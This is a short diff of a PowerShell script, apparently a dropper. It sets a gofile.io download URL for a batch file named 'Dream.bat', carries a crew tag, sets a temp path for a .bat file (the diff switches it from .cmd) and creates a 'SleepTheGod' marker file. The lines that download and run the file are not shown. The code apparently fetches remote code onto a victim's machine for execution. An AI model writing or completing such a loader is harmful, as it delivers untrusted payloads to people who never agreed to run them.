@@ -1,6 +1,6 @@
 $a = "<https://store8.gofile.io/download/web/082133f4-818e-4d62-a029-6eada90e3560/Dream.bat>"
 # IGBOAT Crew
-$y = "$env:temp\\xxxxx.cmd"
+$y = "$env:temp\\xxxxx.bat"
 $sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\\SleepTheGod"
 if (-not (Test-Path $sleepTheGodFilePath)) {
     New-Item -ItemType File -Path $sleepTheGodFilePath -Force | Out-Null
